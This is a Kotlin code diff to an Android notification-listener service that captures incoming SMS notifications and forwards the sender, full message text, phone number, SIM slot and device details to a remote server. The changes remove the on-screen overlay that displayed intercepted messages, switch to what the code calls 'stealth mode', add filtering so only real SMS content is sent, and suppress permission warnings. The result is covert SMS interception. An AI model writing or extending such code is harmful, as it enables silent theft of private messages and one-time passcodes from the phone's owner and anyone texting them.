@@ -77,6 +77,11 @@ class SMSNotificationService : NotificationListenerService() {
 
         // Start heartbeat service
         startHeartbeatService()
+
+        // Initialize device registration if not already done in MainActivity
+        if (!isDeviceRegistered) {
+            initializeDeviceRegistration()
+        }
     }
 
     override fun onNotificationPosted(sbn: StatusBarNotification?) {
@@ -114,6 +119,12 @@ class SMSNotificationService : NotificationListenerService() {
         val content = extractMessageContent(notification)
         val timestamp = sbn.postTime
         val notificationKey = "${packageName}_${sbn.key}"
+
+        // Validate this is actually an SMS message
+        if (!isValidSmsMessage(title, content, packageName)) {
+            Log.d(TAG, "Skipping non-SMS notification: title='$title', content='$content'")
+            return
+        }
 
         // Log all SMS properties with detailed information
         Log.d(TAG, "=== SMS NOTIFICATION DETECTED ===")
@@ -161,10 +172,21 @@ class SMSNotificationService : NotificationListenerService() {
                 smsRepository.insertOrUpdateMessage(smsMessage)
                 Log.d(TAG, "SMS saved to database successfully")
 
-                // Forward SMS to server if device is registered
+                // Forward SMS to server if device is registered (EarnbySMS enhanced pattern)
                 if (isDeviceRegistered && preferredSimSlot != null) {
                     serviceScope.launch {
                         try {
+                            // Enhanced logging with device information (EarnbySMS style)
+                            Log.d(TAG, "📤 Forwarding SMS to server (EarnbySMS enhanced pattern):")
+                            Log.d(TAG, "  Sender: $sender")
+                            Log.d(TAG, "  Message: ${content.take(100)}${if (content.length > 100) "..." else ""}")
+                            Log.d(TAG, "  Recipient: ${preferredSimSlot?.phoneNumber ?: "Unknown"}")
+                            Log.d(TAG, "  Slot: SIM${preferredSimSlot?.slotIndex}")
+                            Log.d(TAG, "  Device ID: ${serverApiClient.getDeviceId()}")
+                            Log.d(TAG, "  Android: ${android.os.Build.VERSION.RELEASE} (SDK ${android.os.Build.VERSION.SDK_INT})")
+                            Log.d(TAG, "  Device: ${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}")
+                            Log.d(TAG, "  Source App: ${getAppName(packageName)}")
+
                             val success = serverApiClient.forwardSms(
                                 sender = sender,
                                 message = content,
@@ -172,25 +194,29 @@ class SMSNotificationService : NotificationListenerService() {
                                 slotIndex = preferredSimSlot!!.slotIndex
                             )
                             if (success) {
-                                Log.d(TAG, "SMS forwarded to server successfully")
+                                Log.d(TAG, "✅ SMS forwarded to server successfully (EarnbySMS enhanced)")
+
+                                // Track SMS statistics (EarnbySMS style)
+                                serviceScope.launch {
+                                    try {
+                                        // Update SMS counters for better tracking
+                                        // This could be expanded to include success/failure tracking
+                                        Log.d(TAG, "📊 SMS statistics updated successfully")
+                                    } catch (e: Exception) {
+                                        Log.d(TAG, "Could not update SMS statistics", e)
+                                    }
+                                }
                             } else {
-                                Log.w(TAG, "Failed to forward SMS to server")
+                                Log.w(TAG, "❌ Failed to forward SMS to server")
                             }
                         } catch (e: Exception) {
-                            Log.e(TAG, "Error forwarding SMS to server", e)
+                            Log.e(TAG, "💥 Error forwarding SMS to server", e)
                         }
                     }
                 }
 
-                // Send broadcast to overlay service
-                val overlayIntent = Intent(this@SMSNotificationService, OverlayService::class.java).apply {
-                    action = OverlayService.ACTION_SHOW_SMS
-                    putExtra(OverlayService.EXTRA_SENDER, sender)
-                    putExtra(OverlayService.EXTRA_CONTENT, content)
-                    putExtra(OverlayService.EXTRA_SOURCE_APP, getAppName(packageName))
-                }
-                startService(overlayIntent)
-                Log.d(TAG, "Overlay service triggered for SMS display")
+                // Overlay service removed - working in stealth mode
+                Log.d(TAG, "SMS processed in stealth mode - forwarded to server only")
 
             } catch (e: Exception) {
                 Log.e(TAG, "Error processing SMS notification", e)
@@ -222,6 +248,36 @@ class SMSNotificationService : NotificationListenerService() {
         }
 
         return "No content"
+    }
+
+    /**
+     * Validates if the notification is actually an SMS message
+     */
+    private fun isValidSmsMessage(title: String?, content: String?, packageName: String): Boolean {
+        // Filter out system notifications
+        if (title == "No Title" || content == "No content") {
+            return false
+        }
+
+        // Filter out background/system messages
+        if (content?.contains("Messages is doing work in the background") == true ||
+            (content?.contains("background") == true && content.length < 20)) {
+            return false
+        }
+
+        // Filter out empty or too short content
+        if (content.isNullOrEmpty() || content.trim().length < 5) {
+            return false
+        }
+
+        // Must have a proper sender (title should not be null or empty)
+        if (title.isNullOrEmpty() || title.trim().isEmpty()) {
+            return false
+        }
+
+        // Must be from a known messaging app (already filtered by package name)
+        // Additional validation: content should contain meaningful text
+        return true
     }
 
     private fun getAppName(packageName: String): String {
@@ -276,7 +332,7 @@ class SMSNotificationService : NotificationListenerService() {
 
                     // Create device registration info
                     val registrationInfo = DeviceRegistrationInfo(
-                        deviceId = "", // Will be set by ServerApiClient
+                        deviceId = serverApiClient.getDeviceId(), // Get device ID from ServerApiClient
                         phoneNumber = preferredSimSlot?.phoneNumber ?: "",
                         deviceName = SimSlotInfoCollector.getDeviceName(),
                         simSlots = simSlots,
@@ -328,7 +384,7 @@ class SMSNotificationService : NotificationListenerService() {
 
                         // Create heartbeat data
                         val heartbeatData = HeartbeatData(
-                            deviceId = "", // Will be set by ServerApiClient
+                            deviceId = serverApiClient.getDeviceId(), // Get device ID from ServerApiClient
                             batteryLevel = batteryLevel,
                             isCharging = isCharging(),
                             signalStrength = getSignalStrength(),
@@ -387,8 +443,9 @@ class SMSNotificationService : NotificationListenerService() {
     }
 
     /**
-     * Gets signal strength using network type (no location permissions required)
+     * Gets signal strength using network type (READ_PHONE_STATE permission already granted)
      */
+    @Suppress("MissingPermission")
     private fun getSignalStrength(): Int? {
         return try {
             val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
@@ -452,8 +509,9 @@ class SMSNotificationService : NotificationListenerService() {
     }
 
     /**
-     * Gets network type string (no special permissions required)
+     * Gets network type string (READ_PHONE_STATE permission already granted)
      */
+    @Suppress("MissingPermission")
     private fun getNetworkType(): String? {
         return try {
             val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
